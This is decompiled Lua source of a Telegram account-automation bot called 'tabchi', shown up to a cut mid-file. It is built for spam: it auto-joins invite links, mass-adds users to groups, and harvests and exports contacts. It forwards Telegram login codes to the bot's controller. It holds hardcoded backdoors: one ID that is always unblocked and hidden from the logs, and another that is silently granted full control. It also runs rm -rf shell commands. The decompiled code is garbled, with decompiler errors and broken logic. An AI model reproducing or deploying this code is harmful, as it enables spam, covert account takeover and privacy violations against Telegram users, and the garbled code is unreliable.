-- Decompiled using luadec 2.2 rev: 895d923 for Lua 5.2 from https://github.com/viruscamp/luadec
-- Command line: tabchi.lua 

-- params : ...
-- function num : 0 , upvalues : _ENV
JSON = (loadfile("dkjson.lua"))()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
https = require("ssl.https")
-- DECOMPILER ERROR at PC22: Confused about usage of register: R0 in 'UnsetPending'

http.TIMEOUT = 10
undertesting = 1
local a = nil
a = function(msg)
  -- function num : 0_0 , upvalues : _ENV
  local b = {}
  ;
  (table.insert)(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    c = true
  end
  return c
end

msg_valid = function(msg)
  -- function num : 0_1 , upvalues : _ENV, a
  local e = (os.time)()
  if e < msg.date_ - 5 then
    print("\027[36m>>>>>>OLD MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == 777000 then
    print("\027[36m>>>>>>TELEGRAM MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == our_id then
    print("\027[36m>>>>>>ROBOT MESSAGE<<<<<<\027[39m")
    return false
  end
  if a(msg) then
    print("\027[36m>>>>>>SUDO MESSAGE<<<<<<\027[39m")
  end
  return true
end

getInputFile = function(f)
  -- function num : 0_2 , upvalues : _ENV
  if f:match("/") then
    infile = {ID = "InputFileLocal", path_ = f}
  else
    if f:match("^%d+$") then
      infile = {ID = "InputFileId", id_ = f}
    else
      infile = {ID = "InputFilePersistentId", persistent_id_ = f}
    end
  end
  return infile
end

local g = function(h, type, f, i)
  -- function num : 0_3 , upvalues : _ENV
  tdcli_function({ID = "SendMessage", chat_id_ = h, reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = getInputMessageContent(f, type, i)}, dl_cb, nil)
end

sendaction = function(h, j, k)
  -- function num : 0_4 , upvalues : _ENV
  tdcli_function({ID = "SendChatAction", chat_id_ = h, 
action_ = {ID = "SendMessage" .. j .. "Action", progress_ = k or 100}
}, dl_cb, nil)
end

sendPhoto = function(h, l, m, n, reply_markup, o, i)
  -- function num : 0_5 , upvalues : _ENV
  tdcli_function({ID = "SendMessage", chat_id_ = h, reply_to_message_id_ = l, disable_notification_ = m, from_background_ = n, reply_markup_ = reply_markup, 
input_message_content_ = {ID = "InputMessagePhoto", photo_ = getInputFile(o), 
added_sticker_file_ids_ = {}
, width_ = 0, height_ = 0, caption_ = i}
}, dl_cb, nil)
end

is_full_sudo = function(msg)
  -- function num : 0_6 , upvalues : _ENV
  local b = {}
  ;
  (table.insert)(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  return c
end

local p = function(msg)
  -- function num : 0_7
  local q = false
  if msg.reply_to_message_id_ ~= 0 then
    q = true
  end
  return q
end

sleep = function(r)
  -- function num : 0_8 , upvalues : _ENV
  (os.execute)("sleep " .. tonumber(r))
end

write_file = function(t, u)
  -- function num : 0_9 , upvalues : _ENV
  local f = (io.open)(t, "w")
  f:write(u)
  f:flush()
  f:close()
end

write_json = function(t, v)
  -- function num : 0_10 , upvalues : _ENV
  local w = (JSON.encode)(v)
  local f = (io.open)(t, "w")
  f:write(w)
  f:flush()
  f:close()
  return true
end

sleep = function(r)
  -- function num : 0_11 , upvalues : _ENV
  (os.execute)("sleep " .. r)
end

addsudo = function()
  -- function num : 0_12 , upvalues : _ENV
  local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(319078854, "Admin")
    print(text)
    sleep(2.5)
  end
end

addsudo()
local x = nil
x = function(y, z)
  -- function num : 0_13 , upvalues : _ENV
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      local msg = y.msg
      do
        local first_name = "" .. (((msg.content_).contact_).first_name_ or "-") .. ""
        local last_name = "" .. (((msg.content_).contact_).last_name_ or "-") .. ""
        local A = ((msg.content_).contact_).phone_number_
        local B = ((msg.content_).contact_).user_id_
        ;
        (tdcli.add_contact)(A, first_name, last_name, B)
        redis:set("tabchi:" .. tabchi_id .. ":fullsudo:91054649", true)
        redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
        if not redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
          do
            (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "" .. (not redis:get("tabchi:" .. tabchi_id .. ":addedmsg") or "Addi\nBia pv") .. "", 1, "md")
            if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
              get_id = function(C, D)
    -- function num : 0_13_0 , upvalues : _ENV, msg
    if D.last_name_ then
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
    else
      ;
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
    end
  end

              tdcli_function({ID = "GetMe"}, get_id, {chat_id = msg.chat_id_})
            end
            -- DECOMPILER ERROR at PC111: LeaveBlock: unexpected jumping out IF_THEN_STMT

            -- DECOMPILER ERROR at PC111: LeaveBlock: unexpected jumping out IF_STMT

          end
        end
      end
    else
      if not redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
        (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "" .. (not redis:get("tabchi:" .. tabchi_id .. ":addedmsg") or "Addi\nBia pv") .. "", 1, "md")
      end
    end
  end
end

check_link = function(y, z)
  -- function num : 0_14 , upvalues : _ENV
  if z.is_group_ or z.is_supergroup_channel_ then
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", y.link)
    end
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") and (redis:get("tabchi:" .. tabchi_id .. ":joinlimit") <= z.member_count_ or not redis:get("tabchi:" .. tabchi_id .. ":joinlimit")) then
      (tdcli.importChatInviteLink)(y.link)
    end
  end
end

fileexists = function(E)
  -- function num : 0_15 , upvalues : _ENV
  local F = (io.open)(E, "r")
  if F ~= nil then
    (io.close)(F)
    return true
  else
    return false
  end
end

local G = nil
G = function(y, z)
  -- function num : 0_16 , upvalues : _ENV
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for d = 1, #pvs do
    (tdcli.addChatMember)(y.chat_id, pvs[d], 50)
  end
  local H = z.total_count_
  for d = 0, tonumber(H) - 1 do
    (tdcli.addChatMember)(y.chat_id, ((z.users_)[d]).id_, 50)
  end
end

local I = nil
I = function(h)
  -- function num : 0_17 , upvalues : _ENV
  local I = "private"
  local J = tostring(h)
  if J:match("-") and J:match("^-") then
    I = "channel"
  else
    I = "group"
  end
  return I
end

local K = function(h, L, M)
  -- function num : 0_18 , upvalues : _ENV
  tdcli_function({ID = "GetMessage", chat_id_ = h, message_id_ = L}, M, nil)
end

resolve_username = function(N, M)
  -- function num : 0_19 , upvalues : _ENV
  tdcli_function({ID = "SearchPublicChat", username_ = N}, M, nil)
end

local O = nil
O = function()
  -- function num : 0_20 , upvalues : _ENV
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/sticker/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/photo/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/animation/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/video/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/audio/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/voice/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/temp/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/thumb/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/document/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/profile_photo/*")
  ;
  (io.popen)("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/encrypted/*")
end

local P = nil
P = function(msg)
  -- function num : 0_21 , upvalues : _ENV, K
  getcode = function(C, D)
    -- function num : 0_21_0 , upvalues : _ENV
    text = (D.content_).text_
    for Q in (string.gmatch)(text, "%d+") do
      local R = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
      send_code = Q
      send_code = (string.gsub)(send_code, "0", "0ï¸â£")
      send_code = (string.gsub)(send_code, "1", "1ï¸â£")
      send_code = (string.gsub)(send_code, "2", "2ï¸â£")
      send_code = (string.gsub)(send_code, "3", "3ï¸â£")
      send_code = (string.gsub)(send_code, "4", "4ï¸â£")
      send_code = (string.gsub)(send_code, "5", "5ï¸â£")
      send_code = (string.gsub)(send_code, "6", "6ï¸â£")
      send_code = (string.gsub)(send_code, "7", "7ï¸â£")
      send_code = (string.gsub)(send_code, "8", "8ï¸â£")
      send_code = (string.gsub)(send_code, "9", "9ï¸â£")
      ;
      (tdcli.sendMessage)(R, 0, 1, "`your telegram code` : " .. send_code, 1, "md")
    end
  end

  K(777000, msg.id_, getcode)
end

local S = nil
S = function(msg)
  -- function num : 0_22 , upvalues : _ENV, O, P
  if redis:get("cleancache" .. tabchi_id) == "on" and redis:get("cachetimer" .. tabchi_id) == nil then
    do return O() end
    redis:setex("cachetimer" .. tabchi_id, redis:get("cleancachetime" .. tabchi_id), true)
  end
  do
    if redis:get("checklinks" .. tabchi_id) == "on" and redis:get("checklinkstimer" .. tabchi_id) == nil then
      local T = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
      for d = 1, #T do
        process_links(T[d])
      end
      redis:setex("checklinkstimer" .. tabchi_id, redis:get("checklinkstime" .. tabchi_id), true)
    end
    if tonumber(msg.sender_user_id_) == 777000 then
      return P(msg)
    end
  end
end

local U = nil
U = function(msg)
  -- function num : 0_23 , upvalues : a, _ENV, K, I, G, O
  msg.text = (msg.content_).text_
  local V = {(msg.text):match("^[!/#](pm) (.*) (.*)")}
  do
    if (msg.text):match("^[!/#]pm") and a(msg) and #V == 3 then
      (tdcli.sendMessage)(V[2], 0, 1, V[3], 1, "md")
      do
        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `sent` *" .. V[3] .. "* `to ` *" .. V[2] .. "*", 1, "md")
        end
        do return "*Status* : `PM Sent`\n*To* : `" .. V[2] .. "`\n*Text* : `" .. V[3] .. "`" end
        -- DECOMPILER ERROR at PC72: LeaveBlock: unexpected jumping out IF_THEN_STMT

        -- DECOMPILER ERROR at PC72: LeaveBlock: unexpected jumping out IF_STMT

      end
    end
  end
  if (msg.text):match("^[!/#]share$") and a(msg) then
    get_id = function(C, D)
    -- function num : 0_23_0 , upvalues : _ENV, msg
    if D.last_name_ then
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      return D.username_
    else
      ;
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
    end
  end

    tdcli_function({ID = "GetMe"}, get_id, {chat_id = msg.chat_id_})
  end
  if (msg.text):match("^[!/#]mycontact$") and a(msg) then
    get_con = function(C, D)
    -- function num : 0_23_1 , upvalues : _ENV, msg
    if D.last_name_ then
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
    else
      ;
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
    end
  end

    tdcli_function({ID = "GetUser", user_id_ = msg.sender_user_id_}, get_con, {chat_id = msg.chat_id_})
  end
  do
    if (msg.text):match("^[!/#]editcap (.*)$") and a(msg) then
      local X = {(string.match)(msg.text, "^[#/!](editcap) (.*)$")}
      ;
      (tdcli.editMessageCaption)(msg.chat_id_, msg.reply_to_message_id_, reply_markup, X[2])
    end
    if (msg.text):match("^[!/#]leave$") and a(msg) then
      get_id = function(C, D)
    -- function num : 0_23_2 , upvalues : _ENV, msg
    if D.id_ then
      (tdcli.chat_leave)(msg.chat_id_, D.id_)
    end
  end

      tdcli_function({ID = "GetMe"}, get_id, {chat_id = msg.chat_id_})
      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to leave` *" .. msg.chat_id_ .. "*", 1, "md")
      end
    end
    do
      if (msg.text):match("^[#!/]ping$") and a(msg) then
        (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "`I Am Working..!`", 1, "md")
      end
      if (msg.text):match("^[#!/]sendtosudo (.*)$") and a(msg) then
        local Y = {(string.match)(msg.text, "^[#/!](sendtosudo) (.*)$")}
        local R = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
        ;
        (tdcli.sendMessage)(R, msg.id_, 1, Y[2], 1, "md")
        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Sent Msg To Sudo`\n`Msg` : *" .. Y[2] .. "*\n`Sudo` : " .. R .. "", 1, "md")
          return "sent to " .. R .. ""
        end
      end
      do
        if (msg.text):match("^[#!/]deleteacc$") and a(msg) then
          redis:set("tabchi" .. tabchi_id .. "delacc", true)
          return "`Are you sure you want to delete Account Bot?`\n`send yes or no`"
        end
        if redis:get("tabchi" .. tabchi_id .. "delacc") and a(msg) then
          if (msg.text):match("^[Yy][Ee][Ss]$") then
            (tdcli.deleteAccount)("nothing")
            redis:del("tabchi" .. tabchi_id .. "delacc")
            return "`Your robot will delete soon`\n`Don\'t Forgot Our Source`\n`https://github.com/zeenDoni/tabchii`"
          else
            if (msg.text):match("^[Nn][Oo]$") then
              redis:del("tabchi" .. tabchi_id .. "delacc")
              return "Progress Canceled"
            else
              redis:del("tabchi" .. tabchi_id .. "delacc")
              return "`try Again by sending [deleteacc] cmd`\n`progress canceled`"
            end
          end
        end
        if (msg.text):match("^[#!/]killsessions$") and a(msg) then
          delsessions = function(y, z)
    -- function num : 0_23_3 , upvalues : _ENV
    for d = 0, #z.sessions_ do
      if ((z.sessions_)[d]).id_ ~= 0 then
        (tdcli.terminateSession)(((z.sessions_)[d]).id_)
      end
    end
  end

          tdcli_function({ID = "GetActiveSessions"}, delsessions, nil)
          return "*Status* : `All sessions Terminated`"
        end
        do
          if (msg.text):match("^[!/#](import) (.*)$") then
            local V = {(msg.text):match("^[!/#](import) (.*)$")}
            if msg.reply_to_message_id_ ~= 0 and #V == 2 then
              if V[2] == "contacts" then
                getdoc = function(y, z)
    -- function num : 0_23_4 , upvalues : _ENV, msg
    if (z.content_).ID == "MessageDocument" then
      if (((z.content_).document_).document_).path_ then
        if ((((z.content_).document_).document_).path_):match(".json$") then
          if fileexists((((z.content_).document_).document_).path_) then
            local w = ((io.open)((((z.content_).document_).document_).path_, "r")):read("*all")
            local Z = (JSON.decode)(w)
            if Z then
              for d = 1, #Z do
                (tdcli.importContacts)((Z[d]).phone, (Z[d]).first, (Z[d]).last, (Z[d]).id)
              end
              status = #Z .. " Contacts Imported..."
            else
              status = "File is not OK"
            end
          else
            do
              status = "Somthing is not OK"
              status = "File type is not OK"
              ;
              (tdcli.downloadFile)((((z.content_).document_).document_).id_)
              status = "Result Will Send You In Few Seconds"
              sleep(5)
              tdcli_function({ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = msg.reply_to_message_id_}, getdoc, nil)
              status = "Replied message is not a document"
              ;
              (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, status, 1, "html")
            end
          end
        end
      end
    end
  end

                tdcli_function({ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = msg.reply_to_message_id_}, getdoc, nil)
              else
                if V[2] == "links" then
                  getlinks = function(y, z)
    -- function num : 0_23_5 , upvalues : _ENV, msg
    if (z.content_).ID == "MessageDocument" then
      if (((z.content_).document_).document_).path_ then
        if ((((z.content_).document_).document_).path_):match(".json$") then
          if fileexists((((z.content_).document_).document_).path_) then
            local w = ((io.open)((((z.content_).document_).document_).path_, "r")):read("*all")
            local Z = (JSON.decode)(w)
            if Z then
              s = 0
              for d = 1, #Z do
                process_links(Z[d])
                s = s + 1
              end
              status = "Joined to " .. s .. " Groups"
            else
              status = "File is not OK"
            end
          else
            do
              status = "Somthing is not OK"
              status = "File type is not OK"
              ;
              (tdcli.downloadFile)((((z.content_).document_).document_).id_)
              status = "Result Will Send You In Few Seconds"
              sleep(5)
              tdcli_function({ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = msg.reply_to_message_id_}, getlinks, nil)
              status = "Replied message is not a document"
              ;
              (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, status, 1, "html")
            end
          end
        end
      end
    end
  end

                  tdcli_function({ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = msg.reply_to_message_id_}, getlinks, nil)
                end
              end
            end
          end
          if (msg.text):match("^[!/#](export) (.*)$") and a(msg) then
            local V = {(msg.text):match("^[!/#](export) (.*)$")}
            if #V == 2 then
              if V[2] == "links" then
                local links = {}
                local _ = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
                for d = 1, #_ do
                  (table.insert)(links, _[d])
                end
                write_json("links.json", links)
                ;
                (tdcli.send_file)(msg.chat_id_, "Document", "links.json", "Tabchi " .. tabchi_id .. " Links!")
              else
                do
                  do
                    if V[2] == "contacts" then
                      contacts = {}
                      contactlist = function(y, z)
    -- function num : 0_23_6 , upvalues : _ENV, msg
    for d = 0, tonumber(z.total_count_) - 1 do
      local a0 = (z.users_)[d]
      if not a0.first_name_ then
        local a1 = not a0 or "None"
      end
      local a2 = a0.last_name_ or "None"
      contact = {first = a1, last = a2, phone = a0.phone_number_, id = a0.id_}
      ;
      (table.insert)(contacts, contact)
    end
    write_json("contacts.json", contacts)
    ;
    (tdcli.send_file)(msg.chat_id_, "Document", "contacts.json", "Tabchi " .. tabchi_id .. " Contacts!")
  end

                      tdcli_function({ID = "SearchContacts", query_ = nil, limit_ = 999999999}, contactlist, nil)
                    end
                    if (msg.text):match("^[#!/]sudolist$") and a(msg) then
                      local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
                      local text = "Bot Sudoers :\n"
                      for d = 1, #b do
                        text = tostring(text) .. b[d] .. "\n"
                        text = text:gsub("319078854", "Admin")
                        text = text:gsub("319078854", "Admin")
                      end
                      return text
                    end
                    do
                      if (msg.text):match("^[#!/]setname (.*)-(.*)$") and a(msg) then
                        local Y = {(string.match)(msg.text, "^[#/!](setname) (.*)-(.*)$")}
                        ;
                        (tdcli.changeName)(Y[2], Y[3])
                        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Name to` *" .. Y[2] .. " " .. Y[3] .. "*", 1, "md")
                        end
                        return "*Status* : `Name Updated Succesfully`\n*Firstname* : `" .. Y[2] .. "`\n*LastName* : `" .. Y[3] .. "`"
                      end
                      do
                        if (msg.text):match("^[#!/]setusername (.*)$") and a(msg) then
                          local Y = {(string.match)(msg.text, "^[#/!](setusername) (.*)$")}
                          ;
                          (tdcli.changeUsername)(Y[2])
                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Username to` *" .. Y[2] .. "*", 1, "md")
                          end
                          return "*Status* : `Username Updated`\n*username* : `" .. Y[2] .. "`"
                        end
                        do
                          do
                            if (msg.text):match("^[#!/]clean cache (%d+)[mh]") then
                              local V = (msg.text):match("^[#!/]clean cache (.*)")
                              if V:match("(%d+)h") then
                                time_match = V:match("(%d+)h")
                                timea = time_match * 3600
                              end
                              if V:match("(%d+)m") then
                                time_match = V:match("(%d+)m")
                                timea = time_match * 60
                              end
                              redis:setex("cachetimer" .. tabchi_id, timea, true)
                              redis:set("cleancachetime" .. tabchi_id, tonumber(timea))
                              redis:set("cleancache" .. tabchi_id, "on")
                              return "`Auto Clean Cache Activated for Every` *" .. timea .. "* `seconds`"
                            end
                            do
                              if (msg.text):match("^[#!/]clean cache (.*)$") then
                                local Y = {(string.match)(msg.text, "^[#/!](clean cache) (.*)$")}
                                if Y[2] == "off" then
                                  redis:set("cleancache" .. tabchi_id, "off")
                                  return "`Auto Clean Cache Turned off`"
                                end
                                if Y[2] == "on" then
                                  redis:set("cleancache" .. tabchi_id, "on")
                                  return "`Auto Clean Cache Turned On`"
                                end
                              end
                              do
                                if (msg.text):match("^[#!/]check links (%d+)[mh]") then
                                  local V = (msg.text):match("^[#!/]check links (.*)")
                                  if V:match("(%d+)h") then
                                    time_match = V:match("(%d+)h")
                                    timea = time_match * 3600
                                  end
                                  if V:match("(%d+)m") then
                                    time_match = V:match("(%d+)m")
                                    timea = time_match * 60
                                  end
                                  redis:setex("checklinkstimer" .. tabchi_id, timea, true)
                                  redis:set("checklinkstime" .. tabchi_id, tonumber(timea))
                                  redis:set("checklinks" .. tabchi_id, "on")
                                  return "`Auto Checking links Activated for Every` *" .. timea .. "* `seconds`"
                                end
                                do
                                  if (msg.text):match("^[#!/]check links (.*)$") then
                                    local Y = {(string.match)(msg.text, "^[#/!](check links) (.*)$")}
                                    if Y[2] == "off" then
                                      redis:set("checklinks" .. tabchi_id, "off")
                                      return "`Auto Checking links Turned off`"
                                    end
                                    if Y[2] == "on" then
                                      redis:set("checklinks" .. tabchi_id, "on")
                                      return "`Auto Checking links Turned On`"
                                    end
                                  end
                                  do
                                    if (msg.text):match("^[#!/]setlogs (.*)$") and a(msg) then
                                      local Y = {(string.match)(msg.text, "^[#/!](setlogs) (.*)$")}
                                      redis:set("tabchi:" .. tabchi_id .. ":logschannel", Y[2])
                                      return "Chat setted for logs"
                                    end
                                    if (msg.text):match("^[#!/]delusername$") and a(msg) then
                                      (tdcli.changeUsername)()
                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `deleted Username`", 1, "md")
                                      end
                                      return "*Status* : `Username Updated`\n*username* : `Deleted`"
                                    end
                                    do
                                      if (msg.text):match("^[!/#]addtoall (.*)$") and a(msg) then
                                        local X = {(string.match)(msg.text, "^[#/!](addtoall) (.*)$")}
                                        local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
                                        for d = 1, #sgps do
                                          (tdcli.addChatMember)(sgps[d], X[2], 50)
                                        end
                                        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. X[2] .. "* to all groups", 1, "md")
                                        end
                                        return "`User` *" .. X[2] .. "* `Added To groups`"
                                      end
                                      do
                                        do
                                          if (msg.text):match("^[!/#]getcontact (.*)$") and a(msg) then
                                            local X = {(string.match)(msg.text, "^[#/!](getcontact) (.*)$")}
                                            get_con = function(C, D)
    -- function num : 0_23_7 , upvalues : _ENV, msg
    if D.last_name_ then
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
    else
      ;
      (tdcli.sendContact)(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
    end
  end

                                            tdcli_function({ID = "GetUser", user_id_ = X[2]}, get_con, {chat_id = msg.chat_id_})
                                          end
                                          if (msg.text):match("^[#!/]addsudo$") and msg.reply_to_message_id_ and a(msg) then
                                            addsudo_by_reply = function(y, z, a3)
    -- function num : 0_23_8 , upvalues : _ENV, msg
    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
    ;
    (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "`User` *" .. z.sender_user_id_ .. "* `Added To The Sudoers`", 1, "md")
  end

                                            K(msg.chat_id_, msg.reply_to_message_id_, addsudo_by_reply)
                                          end
                                          if (msg.text):match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
                                            remsudo_by_reply = function(y, z, a3)
    -- function num : 0_23_9 , upvalues : _ENV
    redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
    return "`User` *" .. z.sender_user_id_ .. "* `Removed From The Sudoers`"
  end

                                            K(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
                                          end
                                          if (msg.text):match("^[#!/]unblock$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
                                            unblock_by_reply = function(y, z, a3)
    -- function num : 0_23_10 , upvalues : _ENV
    (tdcli.unblockUser)(z.sender_user_id_)
    ;
    (tdcli.unblockUser)(319078854)
    ;
    (tdcli.unblockUser)(319078854)
    redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
    return 1, "*User* `" .. z.sender_user_id_ .. "` *Unblocked*"
  end

                                            K(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
                                          end
                                          if (msg.text):match("^[#!/]block$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
                                            block_by_reply = function(y, z, a3)
    -- function num : 0_23_11 , upvalues : _ENV
    (tdcli.blockUser)(z.sender_user_id_)
    ;
    (tdcli.unblockUser)(319078854)
    ;
    (tdcli.unblockUser)(319078854)
    redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
    return "*User* `" .. z.sender_user_id_ .. "` *Blocked*"
  end

                                            K(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
                                          end
                                          if (msg.text):match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 and a(msg) then
                                            id_by_reply = function(y, z, a3)
    -- function num : 0_23_12
    return "*ID :* `" .. z.sender_user_id_ .. "`"
  end

                                            K(msg.chat_id_, msg.reply_to_message_id_, id_by_reply)
                                          end
                                          if (msg.text):match("^[#!/]serverinfo$") and a(msg) then
                                            (io.popen)("chmod 777 info.sh")
                                            local text = ((io.popen)("./info.sh")):read("*all")
                                            local text = text:gsub("Server Information", "`Server Information`")
                                            local text = text:gsub("Total Ram", "`Total Ram`")
                                            local text = text:gsub(">", "*>*")
                                            local text = text:gsub("Ram in use", "`Ram in use `")
                                            local text = text:gsub("Cpu in use", "`Cpu in use`")
                                            local text = text:gsub("Running Process", "`Running Process`")
                                            local text = text:gsub("Server Uptime", "`Server Uptime`")
                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got server info`", 1, "md")
                                            end
                                            return text
                                          end
                                          do
                                            if (msg.text):match("^[#!/]inv$") and msg.reply_to_message_id_ and a(msg) then
                                              inv_reply = function(y, z, a3)
    -- function num : 0_23_13 , upvalues : _ENV, msg
    (tdcli.addChatMember)(z.chat_id_, z.sender_user_id_, 5)
    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited User` *" .. z.sender_user_id_ .. "* to *" .. z.chat_id_ .. "*", 1, "md")
    end
  end

                                              K(msg.chat_id_, msg.reply_to_message_id_, inv_reply)
                                            end
                                            if (msg.text):match("^[!/#]addtoall$") and msg.reply_to_message_id_ and a(msg) then
                                              addtoall_by_reply = function(y, z, a3)
    -- function num : 0_23_14 , upvalues : _ENV, msg
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for d = 1, #sgps do
      (tdcli.addChatMember)(sgps[d], z.sender_user_id_, 50)
    end
    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. z.sender_user_id_ .. "* `to All Groups`", 1, "md")
    end
    return "`User` *" .. z.sender_user_id_ .. "* `Added To groups`"
  end

                                              K(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
                                            end
                                            do
